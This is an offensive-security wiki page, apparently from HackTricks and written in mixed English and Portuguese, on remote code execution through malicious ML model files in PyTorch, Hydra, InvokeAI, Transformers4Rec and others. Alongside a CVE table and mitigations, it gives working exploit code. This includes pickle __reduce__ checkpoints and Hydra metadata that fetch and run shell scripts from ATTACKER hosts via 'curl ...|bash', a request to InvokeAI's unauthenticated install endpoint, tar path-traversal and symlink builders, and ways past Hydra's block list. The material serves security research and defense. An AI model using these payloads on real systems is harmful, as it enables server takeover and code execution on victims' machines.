# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Desserialização insegura em* `torch.load` **(CVE-2025-32434)**                                                              | Pickle malicioso em checkpoint do modelo leva à execução de código (contornando a proteção `weights_only`)                                | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + download malicioso de modelo causa execução de código; deserialização Java RCE na API de gestão                                    | |
| **NVIDIA Merlin Transformers4Rec** | Desserialização insegura de checkpoint via `torch.load` **(CVE-2025-23298)**                                           | Checkpoint não confiável aciona reducer de pickle durante `load_model_trainer_states_from_checkpoint` → execução de código no worker de ML | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Carregar modelo a partir de YAML usa `yaml.unsafe_load` (execução de código) <br> Carregar modelo com camada **Lambda** executa código Python arbitrário | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Modelo `.tflite` malformado desencadeia overflow inteiro → corrupção de heap (potencial RCE)                                             | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Carregar um modelo via `joblib.load` executa pickle com o payload `__reduce__` do atacante                                               | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` por padrão permitia arrays com objetos pickled – `.npy/.npz` maliciosos disparam execução de código                          | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | O caminho de external-weights do modelo ONNX pode escapar do diretório (ler arquivos arbitrários) <br> Tar de modelo ONNX malicioso pode sobrescrever arquivos arbitrários (levando a RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Modelo com operador custom requer o carregamento de código nativo do atacante; grafos complexos podem abusar da lógica para executar computações não intencionadas | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Usar a API de carregamento de modelos com `--model-control` habilitado permite traversal de caminho relativo para escrever arquivos (ex.: sobrescrever `.bashrc` para RCE) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Arquivo de modelo GGUF malformado causa buffer overflows no parser, permitindo execução de código arbitrário no sistema vítima            | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | HDF5 (`.h5`) de modelo malicioso com camada Lambda ainda executa ao carregar (Keras safe_mode não cobre formato antigo – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Muitas ferramentas de ML (ex.: formatos baseados em pickle, `pickle.load` do Python) executarão código arbitrário embutido em arquivos de modelo, a menos que mitigado | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadata não confiável passada para `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadados/configs de modelo controlados pelo atacante definem `_target_` para callable arbitrário (ex.: `builtins.exec`) → executado durante o load, mesmo com formatos “seguros” (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- Acionado antes da inicialização do modelo em NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, and FlexTok loaders.
- A lista de bloqueio de strings do Hydra pode ser contornada via caminhos alternativos de importação (e.g., `enum.bltns.eval`) ou nomes resolvidos pela aplicação (e.g., `nemo.core.classes.common.os.system` → `posix`).
- O FlexTok também analisa metadata stringificada com `ast.literal_eval`, permitindo DoS (CPU/memory blowup) antes da chamada ao Hydra.

### 🆕  RCE no InvokeAI via `torch.load` (CVE-2024-12029)

`InvokeAI` é uma popular interface web de código aberto para Stable-Diffusion. As versões **5.3.1 – 5.4.2** expõem o endpoint REST `/api/v2/models/install` que permite aos usuários baixar e carregar modelos a partir de URLs arbitrárias.

Internamente, o endpoint acaba chamando:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando o arquivo fornecido é um **PyTorch checkpoint (`*.ckpt`)**, `torch.load` executa uma **pickle deserialization**. Como o conteúdo vem diretamente de uma URL controlada pelo usuário, um atacante pode embutir um objeto malicioso com um método `__reduce__` personalizado dentro do checkpoint; o método é executado **during deserialization**, levando a **remote code execution (RCE)** no servidor InvokeAI.

A vulnerabilidade recebeu o identificador **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Passo a passo de exploração

1. Crie um checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hospede `payload.ckpt` em um servidor HTTP que você controla (ex.: `http://ATTACKER/payload.ckpt`).
3. Acione o endpoint vulnerável (não requer autenticação):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando o InvokeAI baixa o arquivo, ele chama `torch.load()` → o gadget `os.system` é executado e o atacante obtém execução de código no contexto do processo InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo o fluxo.

#### Condições

•  InvokeAI 5.3.1-5.4.2 (scan flag padrão **false**)  
•  `/api/v2/models/install` acessível ao atacante  
•  O processo tem permissões para executar comandos de shell

#### Mitigações

* Atualize para **InvokeAI ≥ 5.4.3** – o patch define `scan=True` por padrão e realiza escaneamento de malware antes da desserialização.  
* Ao carregar checkpoints programaticamente, use `torch.load(file, weights_only=True)` ou o novo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Aplique listas de permissão / assinaturas para as fontes de modelos e execute o serviço com privilégios mínimos.

> ⚠️ Lembre-se de que **qualquer** formato Python baseado em pickle (incluindo muitos arquivos `.pt`, `.pkl`, `.ckpt`, `.pth`) é inerentemente inseguro para desserializar a partir de fontes não confiáveis.

---

Exemplo de mitigação ad-hoc caso você precise manter versões antigas do InvokeAI rodando atrás de um reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

Transformers4Rec da NVIDIA (parte do Merlin) expôs um loader de checkpoints inseguro que chamava diretamente `torch.load()` em paths fornecidos pelo usuário. Como `torch.load` depende do Python `pickle`, um checkpoint controlado por um atacante pode executar código arbitrário via reducer durante a desserialização.

Caminho vulnerável (pré-correção): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por que isso leva a RCE: no Python `pickle`, um objeto pode definir um reducer (`__reduce__`/`__setstate__`) que retorna um callable e argumentos. O callable é executado durante o unpickling. Se tal objeto estiver presente em um checkpoint, ele é executado antes de quaisquer weights serem usados.

Exemplo mínimo de checkpoint malicioso:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vetores de entrega e raio de impacto:
- Checkpoints/modelos trojanizados compartilhados via repos, buckets ou registros de artefatos
- Pipelines automatizados de deploy/retomada que carregam checkpoints automaticamente
- A execução ocorre dentro de workers de training/inference, frequentemente com privilégios elevados (por exemplo, root em containers)

Correção: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) substituiu a chamada direta `torch.load()` por um desserializador restrito e allow-listed implementado em `transformers4rec/utils/serialization.py`. O novo loader valida tipos/campos e previne que callables arbitrários sejam invocados durante o carregamento.

Orientação defensiva específica para checkpoints do PyTorch:
- Não deserializar (unpickle) dados não confiáveis. Prefira formatos não executáveis como [Safetensors](https://huggingface.co/docs/safetensors/index) ou ONNX quando possível.
- Se precisar usar a serialização do PyTorch, assegure `weights_only=True` (suportado em versões mais recentes do PyTorch) ou utilize um unpickler customizado com allow-list similar ao patch do Transformers4Rec.
- Imponha proveniência/assinaturas do modelo e deserialização em sandbox (seccomp/AppArmor; usuário não-root; FS restrito e sem saída de rede).
- Monitore processos filhos inesperados originados pelos serviços de ML no momento do carregamento do checkpoint; trace o uso de `torch.load()`/`pickle`.

POC e referências (vulnerável/patch):
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Exemplo – criando um modelo PyTorch malicioso

- Crie o modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carregar o modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

O FaceDetection-DSFD da Tencent expõe um endpoint `resnet` que deserializes dados controlados pelo usuário. A ZDI confirmou que um atacante remoto pode coagir uma vítima a carregar uma página/arquivo malicioso, fazê-la enviar um crafted serialized blob para esse endpoint e acionar deserialization como `root`, levando ao comprometimento total.

The exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Qualquer gadget acessível durante a deserialization (constructors, `__setstate__`, framework callbacks, etc.) pode ser weaponized da mesma forma, independentemente de o transporte ser HTTP, WebSocket ou um arquivo deixado em um diretório monitorado.


## Modelos para Path Traversal

Como comentado em [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), a maioria dos formatos de modelos usados por diferentes AI frameworks é baseada em arquivos, normalmente `.zip`. Portanto, pode ser possível abusar desses formatos para realizar path traversal attacks, permitindo ler arquivos arbitrários do sistema onde o modelo é carregado.

Por exemplo, com o código a seguir você pode criar um modelo que criará um arquivo no diretório `/tmp` quando for carregado:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, com o código a seguir você pode criar um modelo que criará um symlink para o diretório `/tmp` quando carregado:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Análise aprofundada: Keras .keras deserialization and gadget hunting

Para um guia focado em .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, and post-fix gadget discovery inside the allowlist, veja:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referências

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
